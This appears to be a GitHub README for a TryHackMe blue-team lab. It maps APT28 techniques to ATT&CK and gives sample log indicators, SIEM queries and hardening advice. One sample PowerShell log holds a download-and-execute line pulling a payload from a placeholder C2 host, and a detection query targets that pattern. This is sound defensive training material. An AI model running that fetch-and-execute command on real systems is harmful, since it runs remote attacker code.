# 🔍 Eviction Lab – APT28 TTP Mapping & Defensive Eviction Strategy

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-black?style=flat)](https://tryhackme.com)
[![Framework](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-blue?style=flat)](https://attack.mitre.org/)
[![Status](https://img.shields.io/badge/Status-Completed-success?style=flat)]()

Structured SOC analyst investigation demonstrating threat intelligence ingestion, MITRE ATT&CK mapping, adversary TTP prioritization, log indicator identification, SIEM detection strategy development, and proactive eviction planning for APT28 (Fancy Bear).

---

## 📋 Overview
This lab simulates a high-severity threat intelligence alert: APT28 targeting a strategic organization (E-Corp) for espionage. As a SOC analyst, the role is to ingest intel, use MITRE ATT&CK Navigator to map likely TTPs, assess intrusion risk, define observable log artifacts, recommend SIEM/EDR hunting queries, and outline layered controls to detect, prevent, and evict the threat before material impact.

**Key Focus**  
- Translate APT28 behaviors into observable log artifacts  
- Identify log sources and hypothetical indicators of compromise  
- Recommend SIEM detection rules and hardening measures  
- Produce structured SOC documentation for threat-informed defense  

**Tools Used**  
- MITRE ATT&CK Navigator (layer import & visualization)  
- Open-source threat intelligence (MITRE Group G0007 profile)  
- Conceptual log correlation: Windows Event Logs, Sysmon, proxy/firewall, EDR telemetry  
- Markdown for investigation reporting & evidence capture

---

## 🎯 Objectives
- Analyze APT28 threat intelligence and map TTPs in ATT&CK Navigator  
- Identify log-based indicators of compromise for high-risk techniques  
- Recommend log sources, SIEM queries, and hardening to detect/prevent/evict  
- Document structured SOC reporting suitable for threat-informed defense operations

---

## 🛠 Tools & Technologies
- MITRE ATT&CK Navigator  
- Threat intelligence sources (MITRE ATT&CK Enterprise)  
- Conceptual log sources: Windows Event Logs, Sysmon, Proxy/Firewall logs, EDR telemetry  
- SIEM platforms (Elastic Stack / Splunk – conceptual query examples)  
- Markdown for structured investigation documentation

---

## 🔎 Investigation Process

### 1️⃣ Initial Detection & Intelligence Review
Threat intelligence flags APT28 campaign targeting organizations in strategic sectors.  
Severity: Critical – espionage risk with high persistence potential.  
Initial indicators: Spear-phishing, proxy obfuscation, living-off-the-land execution.  
No active compromise confirmed — proactive hunting and monitoring required.

#### 📸 Evidence – Lab Completion & Validated Answers
<img src="https://i.imgur.com/0lHOIKf.png" width="850" alt="TryHackMe Eviction Lab – 100% Completion with Correct Answers"/>

---

### 2️⃣ Technical Analysis & Framework Mapping
Imported provided APT28 layer into MITRE ATT&CK Navigator.  
Filtered high-frequency tactics: Reconnaissance → Initial Access → Execution → Persistence → Defense Evasion.  
Prioritized techniques with observable log artifacts (e.g., PowerShell execution, credential access, proxy chaining).

#### 📸 Evidence – MITRE ATT&CK Navigator Layer (Highlighted APT28 Techniques)
<img src="https://i.imgur.com/wgZ6C35.png" width="850" alt="APT28 TTPs Mapped in MITRE ATT&CK Navigator – PowerShell, Token Impersonation/Theft, Registry Run Keys, Proxy, etc."/>

---

### 3️⃣ Threat Context & Log Indicators
APT28 employs stealthy, low-footprint attacks leveraging native tools and legitimate accounts.  
Suspicious patterns: Phishing → Script execution → Valid account abuse → Proxy C2.  
If present in the environment, expect artifacts across these log sources:

**Example Log Indicators by Technique**  
- **T1566 Phishing**  
  Email gateway / proxy log example:  
src_ip=185.220.101.XX | dest=mail.corp.com | action=allow | file=invoice_urgent.docm | attachment_type=malicious


- **T1059 Command and Scripting Interpreter**  
Windows Event ID 4104 (PowerShell Script Block Logging):  

EventID: 4104
ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://c2.domain/payload.ps1')


- **T1078 Valid Accounts**  
Security Event ID 4624 (Anomalous Logon):

EventID: 4624
Logon Type: 10 (RemoteInteractive)
Account Name: svc-admin
Workstation Name: EXTERNAL-PROXY
IpAddress: 238.163.231.224

- **T1090 Proxy**  
Firewall/proxy session log example:

src=10.10.10.50 | dst=proxy1.example.com → proxy2.example.com → c2.malicious.ru
bytes_out=1.2MB | protocol=TCP | user_agent=Mozilla/5.0 (compatible)


---

## 🧠 MITRE ATT&CK Mapping

| Tactic              | Technique                          | ID      | Key Log Sources / Indicators                          |
|---------------------|------------------------------------|---------|-------------------------------------------------------|
| Reconnaissance      | Gather Victim Identity Information | T1589   | Passive DNS logs, web proxy access logs               |
| Initial Access      | Phishing                           | T1566   | Email gateway logs, proxy logs, attachment metadata   |
| Initial Access      | External Remote Services           | T1133   | VPN/RDP Event ID 4624/4771, authentication logs      |
| Execution           | Command and Scripting Interpreter  | T1059   | Event ID 4104, Sysmon Event ID 1/3/7, process logs   |
| Persistence         | Valid Accounts                     | T1078   | Event ID 4624, 4672, account usage anomalies         |
| Defense Evasion     | Proxy                              | T1090   | Proxy/firewall session logs, egress destination logs |

---

## 🛡 Defensive Considerations

**Detection Rules & SIEM Queries (Conceptual Examples)**  
- PowerShell anomalies (Elastic/Kibana KQL):  
`event.code:4104 and process.name:powershell.exe and message:*IEX* or message:*DownloadString* | stats count by host.name, message`

- Unusual remote logons (Splunk SPL):  
`index=windows EventCode=4624 Logon_Type=10 Workstation_Name!=CORP-* | stats count by Account_Name, IpAddress | where count > 3`

- Proxy chaining alert:  
Baseline egress destinations → alert on multi-hop sessions to high-risk IPs/domains

**Required Log Sources**  
- Windows Event Logs + Sysmon (process creation, script blocks, network connections)  
- Proxy / Firewall logs (egress traffic, user-agent, bytes transferred)  
- EDR telemetry (command-line arguments, parent-child process relationships)  
- Email security gateway (phishing attachments, sender reputation)

**Hardening & Eviction Recommendations**  
- Enforce phishing-resistant MFA + email attachment sandboxing  
- Restrict PowerShell execution policy + enable full script block logging  
- Implement network segmentation + strict egress filtering  
- Automate credential reset + endpoint isolation on high-confidence indicators  
- Schedule regular ATT&CK-based threat hunting queries in SIEM

---

## 📌 Key Skills Demonstrated
- Threat intelligence correlation to observable log artifacts  
- MITRE ATT&CK Navigator usage & TTP visualization  
- Log indicator identification & SIEM detection rule development  
- Defensive control prioritization & eviction strategy formulation  
- Professional SOC-level documentation & evidence presentation

---

Feel free to fork or star if this write-up supports your SOC / blue-team learning.

MIT License – see the [LICENSE](LICENSE) file for details.

